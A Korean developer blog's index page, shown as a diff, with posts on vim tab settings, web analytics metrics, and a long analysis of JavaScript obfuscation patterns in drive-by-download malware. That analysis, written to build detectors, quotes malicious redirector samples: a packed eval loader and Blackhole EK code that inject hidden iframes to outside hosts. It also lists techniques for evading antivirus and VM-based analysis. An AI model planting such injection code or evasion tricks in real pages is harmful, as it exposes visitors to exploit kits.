@@ -1,0 +1,1902 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Ted Logan&rsquo;s Secrets of tabs in vim 에서 읽은 내용을 정리. Vim 에서. vim 에서 눈에 보이는 indentation 은 &lsquo;\t&rsquo; 와 space 의 조합으로 이루어져 있음. tabstop 은,
+&lsquo &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/posts/19/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/06/12/tabs/">Tabs</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-06-12T11:48:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>11:48 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Ted Logan&rsquo;s <a href="http://tedlogan.com/techblog3.html">Secrets of tabs in vim</a> 에서 읽은 내용을 정리.</p>
+
+<p>Vim 에서.</p>
+
+<p>vim 에서 눈에 보이는 indentation 은 &lsquo;\t&rsquo; 와 space 의 조합으로 이루어져 있음.</p>
+
+<p>tabstop 은,
+&lsquo;\t&rsquo; 을 렌더링할 때 기준이 될 hard 한 column grid 의 간격을 결정함.</p>
+
+<p>일반적으로 tabstop 과 softtabstop 을 같게 설정하나,</p>
+
+<p>tabstop 과 softtabstop 의 개념을 설명하기 위해서</p>
+
+<p>굳이 다르게 설정해보겠음.</p>
+
+<p>noexpandtab 기준으로 설명하면,</p>
+
+<p>:set tabstop=4 softtabstop=4 noexpandtab 입력 후
+1[TAB]2[TAB]3[TAB]4 입력.</p>
+
+<p>화면에 이렇게 나타남.</p>
+
+<pre>
+1234567890123456789012345678901234567890
+1   2   3   4
+</pre>
+
+
+<p>[RETURN] 치고, :set tabstop=4 softtabstop=3 noexpandtab 입력 후
+동일하게 1[TAB]2[TAB]3[TAB]4 입력.</p>
+
+<pre>
+1234567890123456789012345678901234567890
+1   2   3   4
+1  2  3  4  5
+</pre>
+
+
+<p>이제 :set list 로 특수문자 표시.</p>
+
+<pre>
+1234567890123456789012345678901234567890$
+1^I2^I3^I4$
+1  2  3^I 4^I5$
+</pre>
+
+
+<p>그럼, 설명 시작.</p>
+
+<p>tabstop=4
+softtabstop=3
+일 경우.</p>
+
+<p>[TAB] 키를 누르면,
+soft 한 tab grid 는 3 column 간격으로 이루어져 있지만,
+hard 한 tab grid 는 4 column 간격으로 이루어져 있기 때문에,
+둘째줄 처음 2,3 는 space 만 가지고 전진했고, 4 는 &lsquo;\t&rsquo; + space 로 전진.</p>
+
+<p>즉 noexpandtab 일 경우, softtabstop 그리드와 (hard)tabstop 그리드가
+틀리니까, vim 이 &lsquo;\t&rsquo; 와 space 조합으로 인덴테이션을 만들어냄.</p>
+
+<p>정리하면 tabstop 는 &lsquo;\t&rsquo; 를 포지셔닝할 그리드를 만들때 사용.
+softtabstop 는 눈에 보이는 그리드.</p>
+
+<p>tabstop != softtabstop 일 경우, &lsquo;\t&rsquo; 만으로 softtabstop 그리드에 인덴트할 수
+없기때문에, space 로 메꿔줌.</p>
+
+<p>그런데, 인덴테이션이 &lsquo;\t&rsquo; + space 로 만들어지면,
+space 파트는 안변하지만 &lsquo;\t&rsquo; 파트는 tabstop 에 따라서 달라짐.</p>
+
+<p>문제는 어떤 인덴트는 space 만으로, 어떤 인덴트는 &lsquo;\t&rsquo; + two spaces 로,
+이런 식으로 중구난방이기 때문에, tabstop 이 달라지면 인덴트가 다 깨짐.</p>
+
+<p>그럼으로 인덴테이션은 &lsquo;\t&rsquo; 이나 space 어느 한가지만으로 만들어지는게 좋음.</p>
+
+<p>softtabstop == tabstop 은 같게 하면 좋음.</p>
+
+<p>당연한 이야기를 어렵게 설명했음.</p>
+
+<p>shiftwidth 는 [TAB] 이 아니라 vim 의 &lt; &lt; / > > 로 reindent 할 때 사용됨.</p>
+
+<p>:set tabstop=8 softtabstop=8 shiftwidth=8 noexpandtab</p>
+
+<p>으로 일치를 시켜주던가.</p>
+
+<p>아니면,</p>
+
+<p>:set softtabstop=4 shiftwidth=4 expandtab</p>
+
+<p>으로 &lsquo;\t&rsquo; 를 space 로 대체하면, tabstop 에 영향받지도 않고 굳이 설정할 필요도 없음.</p>
+
+<p>Ruby 사용자라면,</p>
+
+<p>:set ts=2 sts=2 sw=2 expandtab</p>
+
+<p>이 적절.</p>
+
+<p>Tab 을 눈에 보이게 하는 법.</p>
+
+<pre><code>syntax match Tab /\t/
+hi Tab gui=underline guifg=blue ctermbg=blue
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/06/01/javascript-obfuscation-patterns/">JavaScript Obfuscation Patterns</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-06-01T14:14:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2013</span></span> <span class='time'>2:14 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>정리하는 목적은 Malicious JavaScript 을 자동으로 판정하기 위함.</p>
+
+<p>그러기 위해서, 악성 자바스크립트에서 쓰는 syntax pattern 을 정리하고, 자동으로 패턴을 찾아내는 것을
+만들려고 함.</p>
+
+<p>지금 생각하는 수순은</p>
+
+<ol>
+<li>단순한 regexp 스트링 매칭</li>
+<li>HTML Parsing</li>
+<li>JavaScript Parsing -> Abstract Syntax Tree 를 빌드해서, visit 하면서, 패턴을 분석</li>
+<li>JavaScript Runtime 을 돌려서 동적으로 생성되는 Symbol table 이나
+Assignment , String mainpulation 을 분석</li>
+</ol>
+
+
+<p>그리고 Drive-by-download 공격의 redirection 의 단계마다 JavaScript Obfuscation 의 패턴이 조금씩 달라지기 때문에.
+이 점도 고려할 필요가 있음.</p>
+
+<ol>
+<li>랜딩페이지에는 주로 다음 단계로 redirection 하는 코드들이 들어있다.</li>
+</ol>
+
+
+<p>중국의 Hidden Lynx 가 수행했다고 의심되는 작전에서 사용된 redirection code</p>
+
+<pre><code>document.write('&lt;script 
+src="http://www.*******curling.com/Docs/BW06/iframe.js"&gt;&lt;/script&gt;');
+</code></pre>
+
+<p>Gongda pack 으로 traffic 을 돌리기 위해 사용된 redirection code</p>
+
+<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
+if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
+e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
+return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
+3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
+'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
+toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
+</code></pre>
+
+<p>난독화를 해제하면,</p>
+
+<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
+    var expires = new Date();
+    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
+    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
+    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
+}
+</code></pre>
+
+<p>redirection 을 하기 위해서 들어가는 코드들은</p>
+
+<ul>
+<li>간결하고,</li>
+<li>document.write() 로 iframe or script tag 를 뱉어내거나</li>
+<li><p>createElement() 로 script / iframe tag 을 집어 넣는다.</p></li>
+<li><p>다음 단계에서는, 주로 php 가 돌면서 browser fingerprinting 을 하고 적절한 exploit 을 보내준다.
+1 번과 2 번에 들어가는 악성 JavaScript 은 성격이나 패턴이 조금 다르다는 점도 염두에 두려 한다.</p></li>
+</ul>
+
+
+<h2>Patterns</h2>
+
+<h3>Execution</h3>
+
+<p>난독화된 코드를 수행시키는 방법으로는, <code>eval()</code> <code>setTimeout()</code> <code>setInterval()</code> 등이 사용된다.</p>
+
+<h3>Function redefinition</h3>
+
+<p>eval(), unescape(), fromCharCode(), replace(), ActiveXObject() 등의 수상한 함수들을 감추기 위해 사용한다.</p>
+
+<pre><code>&gt; var e=eval;
+&gt; var a=1;
+&gt; e("a=a+1");
+2
+&gt;
+</code></pre>
+
+<p>IDS, IPS, AV 의 패턴 패칭을 우회하기 위해 사용된다.</p>
+
+<h3>document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;]</h3>
+
+<p>JavaScript 에서는 method 도 결국 property 에 불과하기때문에, function 을 document[&ldquo;write&rdquo;] 로 부를 수 있다.
+여기서 좀 더 꼬면 document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;]</p>
+
+<p>DOM 환경이 아니라서, document.write() 라는 함수를 정의해서 테스트한다.</p>
+
+<pre><code>&gt; document = { write: function(str) { console.log(str); } }
+{ write: [Function] }
+&gt; document.write('hi')
+hi
+&gt; document["w"+"r"+"ite"]('hi')
+hi
+&gt;
+</code></pre>
+
+<p>아니면 &ldquo;write&rdquo; 를 변수에 담아서 호출할수도 있다.</p>
+
+<pre><code>&gt; document = { write: function() { console.log("hi"); } }
+{ write: [Function] }
+&gt; document.write()
+hi
+&gt; a = "w"+"r"+"i"+"t"+"e";
+'write'
+&gt; document[a]();
+hi
+&gt;
+</code></pre>
+
+<p>주로 <code>document.write()</code> <code>document.writeln()</code> <code>this.eval()</code> <code>window.eval()</code> 등에 사용한다.
+브라우저에서 JavaScript Global Scope 에서는 this === window 이기 때문에,
+, <code>this.eval()</code> === <code>window.eval()</code></p>
+
+<h3>Funciton redefinition 2</h3>
+
+<p>node 에서 돌려보자.</p>
+
+<p>node 환경이라서 기본적인 DOM 오브젝이 없다. 대강 window.eval() 을 만들어준다.</p>
+
+<pre><code>&gt; window = { eval: function() { console.log('eval') } }
+{ eval: [Function] }
+&gt; window.eval()
+eval
+&gt; v = "va"+"l"
+'val'
+&gt; window[""+"e"+v]()
+eval
+&gt;
+</code></pre>
+
+<p>즉 function redefinition 패턴 + document[&ldquo;w&rdquo;+&ldquo;r&rdquo;+&ldquo;ite&rdquo;] 패턴을 결합하여</p>
+
+<pre><code>v = "va"+"l"
+e = window[""+"e"+v]
+</code></pre>
+
+<p><code>eval()</code> 함수를 <code>e()</code> 로 은밀하게 옮겼다. 앞으로 <code>e()</code> 를 <code>eval()</code> 대신 사용할 수 있다.</p>
+
+<h3>Function redefinition 3</h3>
+
+<pre><code>b={v:{q:{x:this}}}.v.q.x;
+qq='ghej4vabl'
+q=qq[2]+qq[5]+qq[6]
+q=q+qq[8]
+w={v:b[q]}.v
+</code></pre>
+
+<p><code>w=eval()</code> 펑션이 들어가게 된다. <code>w=this["eval"]</code> 로 만들어지는 것이 포인트.</p>
+
+<p>이런 패턴을 detect 하려면 방법은 2 가지가 있을 것 같은데.</p>
+
+<ol>
+<li>JavaScript runtime 을 붙여서 돌리는 것.</li>
+<li>JavaScript Parser 로 AST 를 빌드하고, 변수의 값을 계산해내는 것. (컴파일러 최적화와 유사. Terminal 노드까지 계산이 가능하다면.)</li>
+</ol>
+
+
+<h3>replace()</h3>
+
+<p>&lsquo;OB3S3FUCA!TED!&rsquo;.replace() 을 통해 난독화된 스트링을 풀어서 사용하는 패턴.</p>
+
+<pre><code>&gt; var a;
+&gt; eval('a=un2scap2'.replace(/2/g,'e'));
+[Function: unescape]
+&gt; var str = escape("BABO?!@")
+&gt; a(str)
+'BABO?!@'
+&gt;
+</code></pre>
+
+<p>a() 로 unescape() 된다.</p>
+
+<p>Function redefinition 을 그냥 하는 것이 아니라, replace() 를 통해서 스트링을 한번 푼다음에, eval() 로 하였다.</p>
+
+<h3>split()</h3>
+
+<p>스트링을 split() 해서 list 를 만든다. 보통 byte list 을 만드는데.
+split() 해서 list 를 만들고, 이 리스트를 Math.sin() 등의 다양한 함수로 가공한 후에, fromCharCode() 로
+스트링으로 복원해서 사용한다. eval() 을 한다던지&hellip; Shellcode 로 쓴다던지.</p>
+
+<pre><code>&gt; n="19~50~57~48".split("a~".substr(1));
+[ '19', '50', '57', '48' ]
+</code></pre>
+
+<p>split() 하는 delimeter 를 숨기기 위해 &ldquo;a~&rdquo;.substr(1) 을 사용하였다.</p>
+
+<h3>unescape()</h3>
+
+<p>%XX%YY 형태로 인코딩 된 녀석을 스트링으로 복원한다.</p>
+
+<h3>fromCharCode()</h3>
+
+<pre><code>&gt; String.fromCharCode(104,0164,0164,112,0x3a,0x2f,0x2f,49,50,067,056,48,0x2e,48,46,49,072,0x38,060,070,060,47,47,112,0165,0x46,0x62,0x4a,111,0146,0124,0143,0172,0x43,89,82,0x75,65,111,81,47);
+'http://127.0.0.1:8080//puFbJofTczCYRuAoQ/'
+&gt;
+</code></pre>
+
+<p><strong>스트링을 split() 해서 list 를 만들고 그 리스트에 Math.sin() 등을 이용한 연산을 돌린 후에,
+String.fromCharCode() 로 다시 스트링으로 복원하여, 최후에 eval() 을 돌린다.</strong> 정도가 가능하다.</p>
+
+<p>또 다른 예:</p>
+
+<pre><code>$ cat x.js
+var i = 0;
+
+for(i=0;i&lt;"iDMMNvNSME".length;i++) {
+    console.log(String.fromCharCode("iDMMNvNSME".charCodeAt(i) ^ 0x21));
+}
+$ node x.js
+H
+e
+l
+l
+o
+W
+o
+r
+l
+d
+</code></pre>
+
+<p>&ldquo;HelloWorld&rdquo; 를 0x21 로 XOR 시켜서 저장해놓았다가, 다시 XOR 로 풀어서 <code>fromCharCode()</code> 로
+캐릭터화했다.</p>
+
+<h3>Script/Iframe injection</h3>
+
+<p><code>document.write()</code> <code>document.writeln()</code> <code>createElement('script')</code> <code>createElement('iframe')</code> <code>createElement("object")</code> 을
+사용하여 동적으로 HTML tag 또는 JS 코드를 삽입/실행시키는 테크닉.</p>
+
+<p>Yang Pack EK 의 Redirector 를 보자.</p>
+
+<pre><code>&lt;script type="text/javascript" src="http://js.xxx.com/2744552/tongji.js"&gt;&lt;/script&gt;&lt;noscript&gt;
+&lt;a href="http://www.xxx.com"&gt;&lt;img src="http://img.xxx.com/2744552/tongji.gif" /&gt;&lt;/noscript&gt;
+
+&lt;script language='JavaScript'&gt;
+function booom1() { document.write("&lt;iframe src='t.html' width='50' height='1'&gt;&lt;/iframe&gt;");}
+...
+</code></pre>
+
+<p>document.write() 로 iframe 을 삽입한다.</p>
+
+<p>블랙홀 EK 에서 iframe 을 삽입하는 코드를 보자.</p>
+
+<pre><code>if (document.getElementsByTagName('body')[0]){
+    iframer();
+} else {
+    document.write("&lt;iframe src="http://[removed]/?go=2' width='10' height='10' style="visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
+}
+function iframer() {
+    var f = document.createElement('iframe');
+    f.setAttribute('src', 'http://[removed]/?go=2');
+    f.style.visibility = 'hidden';
+    f.style.position = 'absolute';
+    f.style.left = '0';
+    f.style.top = '0';
+    f.setAttribute('width', '10');
+    f.setAttribute('height', '10');
+    document.getElementsByTagName('body')[0].appendChild(f);
+}
+</code></pre>
+
+<p>createElement() 로 iframe 을 삽입한다.</p>
+
+<h3>try { } catch(e) { }</h3>
+
+<pre><code>&gt; Boolean().prototype.a
+TypeError: Cannot read property 'a' of undefined
+    at repl:1:21
+    at REPLServer.self.eval (repl.js:109:21)
+    at Interface.&lt;anonymous&gt; (repl.js:248:12)
+    at Interface.EventEmitter.emit (events.js:96:17)
+    at Interface._onLine (readline.js:200:10)
+    at Interface._line (readline.js:518:8)
+    at Interface._ttyWrite (readline.js:736:14)
+    at ReadStream.onkeypress (readline.js:97:10)
+    at ReadStream.EventEmitter.emit (events.js:126:20)
+    at emitKey (readline.js:1058:12)
+&gt; try { console.log("1"); Boolean().prototype.a; console.log("2"); } catch(e) { console.log('babo'); }
+1
+babo
+&gt;
+</code></pre>
+
+<p>try {} 에서 일부러 exception 을 발생시켜서, 수행 중간에 catch {} 로 control flow 를 넘긴다.
+정확히 어떤 statement 가 exception 을 발생시키는지 모른다면, control flow 를 짐작할 수 없게 된다.
+Control flow obfuscation 패턴.</p>
+
+<h3>Base64</h3>
+
+<p>HTML 의 몇몇 tag 들은 Base64 인코딩을 풀어서 쓸 수 있다.
+&lt;img> 를 따로 화일로 안만들고 &lt;img tag 에 base64 인코딩을 해서 HTML 화일 1 장에 다 넣을 수가 있는데,
+이것을 이용하는 방법이 있다.
+따로 decoding 루틴을 달 필요가 없기에, 간편하다.</p>
+
+<h3>Radix Conversion</h3>
+
+<pre><code>&gt; -~'0x14f'[720094129.0.toString(2&lt;&lt;4)]
+6
+&gt; -~'0x14f'[720094129.0.toString(2&lt;&lt;4)]
+6
+&gt; 720094129.0.toString(2&lt;&lt;4)
+'length'
+&gt; -~5
+6
+&gt;
+</code></pre>
+
+<p>따라가보자.</p>
+
+<p><code>720094129.0.toString(2&lt;&lt;4)</code> 는 &lsquo;length&rsquo; 가 된다. toString(radix) 로 <code>2&lt;&lt;4</code> 는 32 니까, 32 진법으로
+720094129 를 변환하면 &lsquo;length&rsquo; 가 되는 셈이다. 32 진법에서는 [0-9a-v] 를 사용한다.</p>
+
+<p>&lsquo;0x14f&rsquo;.length 가 되는 셈이고 결국 숫자 5 가 된다. JavaScript 에서 <code>~</code> 는 Bitwise NOT 으로 MSB 가 invert 되니
+음수로 바뀌게 된다.</p>
+
+<p>JavaScript 에서</p>
+
+<pre><code>-1 (base 10) = 1111 1111 1111 1111 1111 1111 1111 1111 (base2)
+</code></pre>
+
+<p>이다. ~0 은 -1 이 된다. -~ 하면 +1 하는 것과 같다.</p>
+
+<p>function 을 redefine 하는 것으로 다시 가보면</p>
+
+<pre><code>&gt; window={eval:function(){console.log("eval");}}
+{ eval: [Function] }
+</code></pre>
+
+<p>이제부터 난독화된 본코드</p>
+
+<pre><code>&gt; var x=490837.0.toString(2&lt;&lt;4);window[x]()
+eval
+&gt;
+</code></pre>
+
+<p>32 진수로 변환해서 &lsquo;eval&rsquo; 이라는 스트링을 얻어냈다.
+window.eval() 을 아주 힘들게 호출했다. 이 정도까지 가면, 패턴 검색정도로는 &ldquo;eval&rdquo; 이라는 스트링을 찾을 수 없다.</p>
+
+<h3>Math</h3>
+
+<pre><code>&gt; Math.log(Math.E)
+1
+</code></pre>
+
+<p>-2 가 필요하면 -2*Math.log(Math.E) 를 사용한다. 간단하지만, 수학울렁증이 있으면 멘탈이 흔들린다.</p>
+
+<p>Math.PI 와 Math.sin() 등을 이용해 x = [ 125.5, 49.5, &hellip; ] 등의 리스트를 가공한다음에 fromCharCode() 를 사용해서
+스트링으로 원복하는 패턴.</p>
+
+<p>다음에는 그냥 쓸데없이 다양한 radix base 의 숫자를 써서 수학 울렁증을 유발시키는 패턴.</p>
+
+<pre><code>&gt; if(020==0x10) console.log('babo')
+babo
+</code></pre>
+
+<p>귀찮게 020 == 0x10 등의 conditional 을 중간 중간에 넣어 헤깔리게 만든다.</p>
+
+<h3>OnMouseMove 핸들러</h3>
+
+<pre><code>document.onmousemove = function() {
+    ...
+    var head = document.getElementsByTagName("head")[0]
+    var script = document.createElement("script")
+    script.type = "text/javascript"
+    script.onreadystatechange = function() {
+        if (this.readyState == "complete") window.handler_state = 2;
+    }
+    script.onload = function() { window.handler_state = 2; }
+    script.src = url + "1x2.js"
+    head.appendChild(script)
+    ...
+}
+</code></pre>
+
+<p>VM 기반의 자동화된 동적 분석에 대항하기 위한 테크닉. 마우스가 움직이면
+&lt;script src=&ldquo;xxx.js&rdquo;> 를 DOM 트리의 &lt;head> 밑에 밀어 넣는다.
+자동화된 VM 분석에 대항하면서, Control flow 를 숨기는 패턴.</p>
+
+<ol>
+<li>VMware / VirtualBox 를 통해 동적분석을 하려하거나,</li>
+<li>JavaScript runtime + DOM emulation 을 가지고 JavaScript 을 인터프리팅하는</li>
+</ol>
+
+
+<p>자동화된 분석 도구를 피해가기 위한 목적이 크다.</p>
+
+<h3>HTML <tag></h3>
+
+<p>HTML tag 에 데이터를 숨기는 기법이다. &lt;iframe> redirection code 를 inject 할 때 자주 사용된다.</p>
+
+<pre><code>&lt;x id="babo" style="display:none"&gt;
+123456789
+&lt;/x&gt;
+
+&lt;script&gt;
+var x= document.getElementById("babo");
+alert(x.innerHTML);
+&lt;/script&gt;
+</code></pre>
+
+<p>&lt;x>&hellip;&lt;/x>  안에 인코딩된 스트링을 숨기고, &lt;script>&lt;/script> 블럭에서 디코딩을 해서,
+&lt;iframe> 태그를 document.write 또는 createElement(&lsquo;iframe&rsquo;) 을 통해서 inject 한다.
+JavaScript 블럭만 정적 분석을 해서는 발견하기가 어렵다.</p>
+
+<h3>Silly Tricks</h3>
+
+<p>조금씩 비트는 수준의 테크닉들이 있다.</p>
+
+<p><code>a = { q:"string" }.q;</code> 는 <code>a="string"</code> 과 같다.</p>
+
+<p>좀 더 비틀어보자.</p>
+
+<p><code>b={v:{q:{x:"string"}}}.v.q.x</code> 은 <code>b="string"</code> 과 같다.</p>
+
+<pre><code>&gt; a = {q:"string"}.q
+'string'
+&gt; a
+'string'
+&gt; b={v:{q:{x:"string"}}}.v.q.x
+'string'
+&gt; b
+'string'
+&gt;
+</code></pre>
+
+<p>이건 for loop 를 비트는 흔한 기술법. <code>for(i=0;i-3782&lt;0;i++){...}</code> 는 <code>for(i=0;i&lt;3782;i++){...}</code> 와 같다.
+아니면 변수를 RHS 에 놓는다. <code>for(i=0;0&gt;i-3782;i=-~i)</code></p>
+
+<pre><code>&gt; for(i=0;0&gt;i-5;i=-~i)console.log(i);
+0
+1
+2
+3
+4
+&gt;
+</code></pre>
+
+<h3>Analysis</h3>
+
+<h4>Static Approach</h4>
+
+<p>지금 생각에 Index of Coincidence, Consonant Ratio, Special Character Ratio 등은 큰 의미가 없을 것 같다.</p>
+
+<p>가정과 질문들은</p>
+
+<ul>
+<li>Redirection 을 해주는 1 단계 페이지들과 감염을 시키는 2 단계 페이지들을 분석할 때 방법론이 다르다.</li>
+<li>모든 악성 웹사이트의 HTML/JavaScript 이 난독화 되어있지는 않다. 담백하게 작성된 것도 적지 않다.</li>
+<li><p>VM 전단계에서 fast-filtering 을 목적으로 하는가 아니면, 특정부분은 VM 보다 나을 수 있는 Client Honeypot 시스템을 만드는가?</p></li>
+<li><p>다음 각각은 특정한 용도가 있다.</p></li>
+</ul>
+
+
+<ol>
+<li>CVE 중심으로 signature 를 찾는 것</li>
+<li>HTML 정적 분석</li>
+<li>JavaScript 정적 분석</li>
+<li>JS 인터프리터와 DOM 에뮬레이터로 동적 분석하는 것</li>
+<li>VM 기반의 동적 분석</li>
+</ol>
+
+
+<p>그리고 메모.</p>
+
+<ul>
+<li>AST 를 파싱해서 loop construct 안에 다량의 스트링 concatenation 이 있는 패턴을 잡기 위한 룰</li>
+<li>for loop construct 하부 트리에 fromCharCode() 나 fromCharCode 의 clone 이 있는 패턴.</li>
+<li>&lt;tag id=&ldquo;xyz&rdquo;> Encrypted Data &lt;tag> 와 같은 패턴을 잡기 위한 룰</li>
+<li>Misplaced &lt;iframe> &amp; &lt;script>: &lt;html> 밖에 위치해 있거나, &lt;head> &lt;body> 의 밖에 위치한 태그들.</li>
+<li>파싱해서 Tree 를 visit 하다가, MemberExpression 안에 BinaryExpression &lsquo;+&rsquo; 가 들어가 있으면 의심해볼 만하다. 정상적인 경우에는 <code>my_object["first_name"]</code> 이런 식으로 코딩하지, <code>my_object["first"+"_"+"name"]</code> 이렇게는 잘 안한다. String 을 [Function] 으로 변환하기 위해서는 String 이라던가 document 라던가 window 의 멤버 참조로 할 수 밖에 없기 때문에.</li>
+</ul>
+
+
+<pre>
+> s=String;
+[Function: String]
+> f="f"+"r"+"omChar"
+'fromChar'
+> s[f+"Code"]
+[Function: fromCharCode]
+</pre>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/28/web-analytics/">Web Analytics</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-02-28T17:06:00+09:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>5:06 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>Visits</h3>
+
+<p>Web Analytics 에서 쓰는 Visits 는 session 과 많은 경우에 동일하다.
+Session 의 정의를 하자면 &ldquo;a collection of requests from someone who is on your website&rdquo; 라고 할 수 있다.</p>
+
+<p>우선 세션에 대해서 알아보자.</p>
+
+<p>JavaScript tag 기반의 web analytics 솔루션을 사용한다고 가정하자.</p>
+
+<ol>
+<li>웹사이트의 페이지를 처음으로 요청할때, 그 브라우저에 대해서 session 을 만든다.</li>
+<li>그 브라우저에서 오는 계속된 요청은 unique session ID 와 묶이게 된다.</li>
+<li>그 사람이 사이트를 떠나면, 그간의 요청된 page view 들을 unique session ID 로 묶어서 하나의 세션으로 처리.</li>
+<li>Total Visits 는 주어진 기간동안의 모든 세션의 갯수들의 합.</li>
+<li>29 분의 inactivity 가 있으면 세션을 끝내버린다.</li>
+</ol>
+
+
+<p>이 세션을 Visits 라고 흔히 말한다.</p>
+
+<h3>Unique Visitors</h3>
+
+<p>그렇다면 Unique Visitors 란?</p>
+
+<p>역시 JavaScript tag 기반의 web analytics 솔루션을 사용한다고 가정.</p>
+
+<ol>
+<li>웹사이트의 페이지를 처음으로 요청할때, analytics tool 은 브라우저에 unique 한 쿠키를 세팅한다.</li>
+<li>웹사이트를 떠나도 그 unique 한 쿠키는 살아있는다.</li>
+<li>그 브라우저를 가지고 웹 사이트를 방문할 때마다, persistent unique cookie ID 를 가지고 동일한 브라우저인지를 판별한다.</li>
+<li>Unique Visitors 는 주어진 기간동안의 &ldquo;the count of all the persistent unique cookie IDs&rdquo; 라고 할 수 있다.</li>
+</ol>
+
+
+<h3>Metric 의 유행</h3>
+
+<p>Hits -> Page Views -> Visitors 로 중요 메트릭이 변해가다가&hellip;</p>
+
+<p>Bounce Rate, Exit Rate, Conversion Rate, Engagement 같은 메트릭이 중요하게 여겨지고 있다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/12/18/hmac-sha1-http-authorization-and-oauth/">HMAC, SHA1, HTTP Authorization and, OAuth</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-12-18T10:05:00+09:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>10:05 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li><a href="http://en.wikipedia.org/wiki/Hash-based_message_authentication_code">Hash-based message authentication code</a></li>
+<li><a href="http://www.drdobbs.com/security/the-hmac-algorithm/184410908">Dr. Dobb&rsquo;s Journal: The HMAC Algorithm</a></li>
+<li><a href="http://en.wikipedia.org/wiki/SHA-1">SHA-1</a></li>
+</ul>
+
+
+<p>HMAC: Hash-based message authentication code</p>
+
+<ul>
+<li>Data integrity</li>
